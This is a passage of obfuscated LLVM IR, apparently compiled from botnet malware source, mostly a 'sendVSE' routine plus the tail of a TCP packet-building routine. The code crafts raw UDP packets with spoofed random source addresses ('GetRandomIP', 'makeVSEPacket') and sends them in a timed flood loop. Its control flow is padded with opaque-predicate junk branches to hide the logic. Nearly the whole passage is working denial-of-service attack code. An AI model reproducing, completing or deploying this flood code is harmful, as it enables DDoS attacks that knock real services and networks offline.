  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon.0* %413 to %struct.anon.1*
  %415 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %414, i32 0, i32 2
  store i32 %411, i32* %415, align 4
  %416 = call i32 @rand_cmwc()
  %417 = trunc i32 %416 to i16
  %418 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon.0* %419 to %struct.anon.1*
  %421 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %420, i32 0, i32 0
  store i16 %417, i16* %421, align 4
  %422 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 0
  %424 = bitcast %union.anon.0* %423 to %struct.anon.1*
  %425 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %424, i32 0, i32 6
  store i16 0, i16* %425, align 4
  %426 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %427 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %428 = call zeroext i16 @tcpcsum(%struct.iphdr* %426, %struct.tcphdr* %427)
  %429 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %430 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %429, i32 0, i32 0
  %431 = bitcast %union.anon.0* %430 to %struct.anon.1*
  %432 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %431, i32 0, i32 6
  store i16 %428, i16* %432, align 4
  %433 = bitcast i8* %134 to i16*
  %434 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 2
  %436 = load i16, i16* %435, align 2
  %437 = zext i16 %436 to i32
  %438 = call zeroext i16 @csum(i16* %433, i32 %437)
  %439 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 7
  store i16 %438, i16* %440, align 2
  %441 = load i32, i32* %22, align 4
  %442 = load i32, i32* %13, align 4
  %443 = icmp eq i32 %441, %442
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %341
  store i32 0, i32* %22, align 4
  br label %originalBB56
}

; Function Attrs: noinline nounwind uwtable
define void @sendVSE(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.sockaddr_in, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.udphdr*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  store i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i32 0, i32 0), i8** %17, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %59

; <label>:39:                                     ; preds = %8
  %40 = load i32, i32* @x.69
  %41 = load i32, i32* @y.70
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %49, i16* %50, align 2
  %51 = load i32, i32* @x.69
  %52 = load i32, i32* @y.70
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %64

; <label>:59:                                     ; preds = %8
  %60 = load i32, i32* %10, align 4
  %61 = trunc i32 %60 to i16
  %62 = call zeroext i16 @htons(i16 zeroext %61) #13
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %62, i16* %63, align 2
  br label %64

; <label>:64:                                     ; preds = %59, %originalBBpart2
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %67 = call i32 @getHost(i8* %65, %struct.in_addr* %66)
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %86

; <label>:69:                                     ; preds = %64
  %70 = load i32, i32* @x.69
  %71 = load i32, i32* @y.70
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* @x.69
  %79 = load i32, i32* @y.70
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %539

; <label>:86:                                     ; preds = %64
  %87 = load i32, i32* @x.69
  %88 = load i32, i32* @y.70
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 3
  %96 = getelementptr inbounds [8 x i8], [8 x i8]* %95, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 8, i32 4, i1 false)
  %97 = load i32, i32* %14, align 4
  store i32 %97, i32* %20, align 4
  %98 = load i32, i32* %12, align 4
  %99 = icmp eq i32 %98, 32
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %99, label %108, label %232

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = load i32, i32* @x.69
  %110 = load i32, i32* @y.70
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %117, i32* %21, align 4
  %118 = load i32, i32* %21, align 4
  %119 = icmp ne i32 %118, 0
  %120 = load i32, i32* @x.69
  %121 = load i32, i32* @y.70
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %119, label %145, label %128

; <label>:128:                                    ; preds = %originalBBpart212
  %129 = load i32, i32* @x.69
  %130 = load i32, i32* @y.70
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %128
  %137 = load i32, i32* @x.69
  %138 = load i32, i32* @y.70
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %539

; <label>:145:                                    ; preds = %originalBBpart212
  %146 = load i32, i32* %13, align 4
  %147 = add nsw i32 %146, 1
  %148 = sext i32 %147 to i64
  %149 = call noalias i8* @malloc(i64 %148) #2
  store i8* %149, i8** %22, align 8
  %150 = load i8*, i8** %22, align 8
  %151 = icmp eq i8* %150, null
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %145
  br label %539

; <label>:153:                                    ; preds = %145
  %154 = load i32, i32* @x.69
  %155 = load i32, i32* @y.70
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %153
  %162 = load i8*, i8** %22, align 8
  %163 = load i32, i32* %13, align 4
  %164 = add nsw i32 %163, 1
  %165 = sext i32 %164 to i64
  call void @llvm.memset.p0i8.i64(i8* %162, i8 0, i64 %165, i32 1, i1 false)
  %166 = load i8*, i8** %22, align 8
  %167 = load i32, i32* %13, align 4
  call void @RandString(i8* %166, i32 %167)
  %168 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %169 = load i32, i32* %11, align 4
  %170 = add nsw i32 %168, %169
  store i32 %170, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %171 = load i32, i32* @x.69
  %172 = load i32, i32* @y.70
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %179

; <label>:179:                                    ; preds = %228, %originalBBpart243, %201, %originalBBpart231
  %180 = load i32, i32* %21, align 4
  %181 = load i8*, i8** %22, align 8
  %182 = load i32, i32* %13, align 4
  %183 = sext i32 %182 to i64
  %184 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %185 = call i64 @sendto(i32 %180, i8* %181, i64 %183, i32 0, %struct.sockaddr* %184, i32 16)
  %186 = load i32, i32* %24, align 4
  %187 = load i32, i32* %20, align 4
  %188 = icmp eq i32 %186, %187
  br i1 %188, label %189, label %202

; <label>:189:                                    ; preds = %179
  %190 = load i32, i32* %10, align 4
  %191 = icmp eq i32 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %189
  %193 = call i32 @rand_cmwc()
  %194 = trunc i32 %193 to i16
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %189
  %197 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %198 = load i32, i32* %23, align 4
  %199 = icmp sgt i32 %197, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %196
  br label %231

; <label>:201:                                    ; preds = %196
  store i32 0, i32* %24, align 4
  br label %179

; <label>:202:                                    ; preds = %179
  %203 = load i32, i32* %24, align 4
  %204 = add i32 %203, 1
  store i32 %204, i32* %24, align 4
  %205 = load i32, i32* %25, align 4
  %206 = load i32, i32* %15, align 4
  %207 = icmp eq i32 %205, %206
  br i1 %207, label %208, label %228

; <label>:208:                                    ; preds = %202
  %209 = load i32, i32* @x.69
  %210 = load i32, i32* @y.70
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %208
  %217 = load i32, i32* %16, align 4
  %218 = mul nsw i32 %217, 1000
  %219 = call i32 @usleep(i32 %218)
  store i32 0, i32* %25, align 4
  %220 = load i32, i32* @x.69
  %221 = load i32, i32* @y.70
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart243, label %originalBB33alteredBB

originalBBpart243:                                ; preds = %originalBB33
  br label %179

; <label>:228:                                    ; preds = %202
  %229 = load i32, i32* %25, align 4
  %230 = add i32 %229, 1
  store i32 %230, i32* %25, align 4
  br label %179

; <label>:231:                                    ; preds = %200
  br label %539

; <label>:232:                                    ; preds = %originalBBpart28
  %233 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %233, i32* %26, align 4
  %234 = load i32, i32* %26, align 4
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %253, label %236

; <label>:236:                                    ; preds = %232
  %237 = load i32, i32* @x.69
  %238 = load i32, i32* @y.70
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %236
  %245 = load i32, i32* @x.69
  %246 = load i32, i32* @y.70
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %539

; <label>:253:                                    ; preds = %232
  store i32 1, i32* %27, align 4
  %254 = load i32, i32* %26, align 4
  %255 = bitcast i32* %27 to i8*
  %256 = call i32 @setsockopt(i32 %254, i32 0, i32 3, i8* %255, i32 4) #2
  %257 = icmp slt i32 %256, 0
  br i1 %257, label %258, label %259

; <label>:258:                                    ; preds = %253
  br label %539

; <label>:259:                                    ; preds = %253
  %260 = load i32, i32* @x.69
  %261 = load i32, i32* @y.70
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %259
  store i32 50, i32* %28, align 4
  %268 = load i32, i32* @x.69
  %269 = load i32, i32* @y.70
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %276

; <label>:276:                                    ; preds = %296, %originalBBpart251
  %277 = load i32, i32* @x.69
  %278 = load i32, i32* @y.70
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %276
  %285 = load i32, i32* %28, align 4
  %286 = add nsw i32 %285, -1
  store i32 %286, i32* %28, align 4
  %287 = icmp ne i32 %285, 0
  %288 = load i32, i32* @x.69
  %289 = load i32, i32* @y.70
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart265, label %originalBB53alteredBB

originalBBpart265:                                ; preds = %originalBB53
  br i1 %287, label %296, label %301

; <label>:296:                                    ; preds = %originalBBpart265
  %297 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %298 = call i32 @rand_cmwc()
  %299 = xor i32 %297, %298
  call void @srand(i32 %299) #2
  %300 = call i32 @rand() #2
  call void @init_rand(i32 %300)
  br label %276

; <label>:301:                                    ; preds = %originalBBpart265
  %302 = load i32, i32* %12, align 4
  %303 = icmp eq i32 %302, 0
  br i1 %303, label %304, label %321

; <label>:304:                                    ; preds = %301
  %305 = load i32, i32* @x.69
  %306 = load i32, i32* @y.70
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %304
  store i32 0, i32* %29, align 4
  %313 = load i32, i32* @x.69
  %314 = load i32, i32* @y.70
  %315 = sub i32 %313, 1
  %316 = mul i32 %313, %315
  %317 = urem i32 %316, 2
  %318 = icmp eq i32 %317, 0
  %319 = icmp slt i32 %314, 10
  %320 = or i1 %318, %319
  br i1 %320, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %327

; <label>:321:                                    ; preds = %301
  %322 = load i32, i32* %12, align 4
  %323 = sub nsw i32 32, %322
  %324 = shl i32 1, %323
  %325 = sub nsw i32 %324, 1
  %326 = xor i32 %325, -1
  store i32 %326, i32* %29, align 4
  br label %327

; <label>:327:                                    ; preds = %321, %originalBBpart269
  %328 = load i32, i32* %13, align 4
  %329 = sext i32 %328 to i64
  %330 = add i64 28, %329
  %331 = call i8* @llvm.stacksave()
  store i8* %331, i8** %30, align 8
  %332 = alloca i8, i64 %330, align 16
  %333 = bitcast i8* %332 to %struct.iphdr*
  store %struct.iphdr* %333, %struct.iphdr** %31, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %335 = bitcast %struct.iphdr* %334 to i8*
  %336 = getelementptr i8, i8* %335, i64 20
  %337 = bitcast i8* %336 to %struct.udphdr*
  store %struct.udphdr* %337, %struct.udphdr** %32, align 8
  %338 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %339 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %19, i32 0, i32 2
  %340 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 4
  %342 = load i32, i32* %29, align 4
  %343 = call i32 @GetRandomIP(i32 %342)
  %344 = call i32 @htonl(i32 %343) #13
  %345 = load i32, i32* %13, align 4
  %346 = sext i32 %345 to i64
  %347 = add i64 8, %346
  %348 = trunc i64 %347 to i32
  call void @makeVSEPacket(%struct.iphdr* %338, i32 %341, i32 %344, i8 zeroext 17, i32 %348)
  %349 = load i32, i32* %13, align 4
  %350 = sext i32 %349 to i64
  %351 = add i64 8, %350
  %352 = load i32, i32* %18, align 4
  %353 = sext i32 %352 to i64
  %354 = add i64 %351, %353
  %355 = trunc i64 %354 to i16
  %356 = call zeroext i16 @htons(i16 zeroext %355) #13
  %357 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %358 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %357, i32 0, i32 0
  %359 = bitcast %union.anon.2* %358 to %struct.anon.3*
  %360 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %359, i32 0, i32 2
  store i16 %356, i16* %360, align 2
  %361 = call i32 @rand_cmwc()
  %362 = trunc i32 %361 to i16
  %363 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 0
  %365 = bitcast %union.anon.2* %364 to %struct.anon.3*
  %366 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %365, i32 0, i32 0
  store i16 %362, i16* %366, align 2
  %367 = load i32, i32* %10, align 4
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %371

; <label>:369:                                    ; preds = %327
  %370 = call i32 @rand_cmwc()
  br label %376

; <label>:371:                                    ; preds = %327
  %372 = load i32, i32* %10, align 4
  %373 = trunc i32 %372 to i16
  %374 = call zeroext i16 @htons(i16 zeroext %373) #13
  %375 = zext i16 %374 to i32
  br label %376

; <label>:376:                                    ; preds = %371, %369
  %377 = phi i32 [ %370, %369 ], [ %375, %371 ]
  %378 = trunc i32 %377 to i16
  %379 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %380 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %379, i32 0, i32 0
  %381 = bitcast %union.anon.2* %380 to %struct.anon.3*
  %382 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %381, i32 0, i32 1
  store i16 %378, i16* %382, align 2
  %383 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %384 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %383, i32 0, i32 0
  %385 = bitcast %union.anon.2* %384 to %struct.anon.3*
  %386 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %385, i32 0, i32 3
  store i16 0, i16* %386, align 2
  %387 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %388 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %389 = bitcast %struct.udphdr* %388 to i8*
  %390 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 0
  %392 = bitcast %union.anon.2* %391 to %struct.anon.3*
  %393 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %392, i32 0, i32 2
  %394 = load i16, i16* %393, align 2
  %395 = load i32, i32* %18, align 4
  %396 = sext i32 %395 to i64
  %397 = add i64 12, %396
  %398 = trunc i64 %397 to i32
  %399 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* %387, i8* %389, i16 zeroext %394, i32 %398)
  %400 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %401 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon.2* %401 to %struct.anon.3*
  %403 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %402, i32 0, i32 3
  store i16 %399, i16* %403, align 2
  %404 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %405 = bitcast %struct.udphdr* %404 to i8*
  %406 = getelementptr inbounds i8, i8* %405, i64 8
  %407 = load i32, i32* %13, align 4
  call void @RandString(i8* %406, i32 %407)
  %408 = bitcast i8* %332 to i16*
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 2
  %411 = load i16, i16* %410, align 2
  %412 = zext i16 %411 to i32
  %413 = call zeroext i16 @csum(i16* %408, i32 %412)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %417 = load i32, i32* %11, align 4
  %418 = add nsw i32 %416, %417
  store i32 %418, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %419

; <label>:419:                                    ; preds = %534, %originalBBpart293, %507, %376
  %420 = load i32, i32* @x.69
  %421 = load i32, i32* @y.70
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %419
  %428 = load i32, i32* @x.69
  %429 = load i32, i32* @y.70
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %436

; <label>:436:                                    ; preds = %originalBBpart273
  %437 = load i32, i32* @x.69
  %438 = load i32, i32* @y.70
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %436
  %445 = load i32, i32* %26, align 4
  %446 = load i32, i32* %18, align 4
  %447 = sext i32 %446 to i64
  %448 = add i64 32, %447
  %449 = trunc i64 %330 to i32
  %450 = bitcast %struct.sockaddr_in* %19 to %struct.sockaddr*
  %451 = call i64 @sendto(i32 %445, i8* %332, i64 %448, i32 %449, %struct.sockaddr* %450, i32 16)
  %452 = call i32 @rand_cmwc()
  %453 = trunc i32 %452 to i16
  %454 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %455 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %454, i32 0, i32 0
  %456 = bitcast %union.anon.2* %455 to %struct.anon.3*
  %457 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %456, i32 0, i32 0
  store i16 %453, i16* %457, align 2
  %458 = load i32, i32* %10, align 4
  %459 = icmp eq i32 %458, 0
  %460 = load i32, i32* @x.69
  %461 = load i32, i32* @y.70
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart285, label %originalBB75alteredBB

originalBBpart285:                                ; preds = %originalBB75
  br i1 %459, label %468, label %470

; <label>:468:                                    ; preds = %originalBBpart285
  %469 = call i32 @rand_cmwc()
  br label %475

; <label>:470:                                    ; preds = %originalBBpart285
  %471 = load i32, i32* %10, align 4
  %472 = trunc i32 %471 to i16
  %473 = call zeroext i16 @htons(i16 zeroext %472) #13
  %474 = zext i16 %473 to i32
  br label %475

; <label>:475:                                    ; preds = %470, %468
  %476 = phi i32 [ %469, %468 ], [ %474, %470 ]
  %477 = trunc i32 %476 to i16
  %478 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 0
  %480 = bitcast %union.anon.2* %479 to %struct.anon.3*
  %481 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %480, i32 0, i32 1
  store i16 %477, i16* %481, align 2
  %482 = call i32 @rand_cmwc()
  %483 = trunc i32 %482 to i16
  %484 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 3
  store i16 %483, i16* %485, align 4
  %486 = load i32, i32* %29, align 4
  %487 = call i32 @GetRandomIP(i32 %486)
  %488 = call i32 @htonl(i32 %487) #13
  %489 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 8
  store i32 %488, i32* %490, align 4
  %491 = bitcast i8* %332 to i16*
  %492 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 2
  %494 = load i16, i16* %493, align 2
  %495 = zext i16 %494 to i32
  %496 = call zeroext i16 @csum(i16* %491, i32 %495)
  %497 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load i32, i32* %34, align 4
  %500 = load i32, i32* %20, align 4
  %501 = icmp eq i32 %499, %500
  br i1 %501, label %502, label %508

; <label>:502:                                    ; preds = %475
  %503 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %504 = load i32, i32* %33, align 4
  %505 = icmp sgt i32 %503, %504
  br i1 %505, label %506, label %507

; <label>:506:                                    ; preds = %502
  br label %537

; <label>:507:                                    ; preds = %502
  store i32 0, i32* %34, align 4
  br label %419

; <label>:508:                                    ; preds = %475
  %509 = load i32, i32* %34, align 4
  %510 = add i32 %509, 1
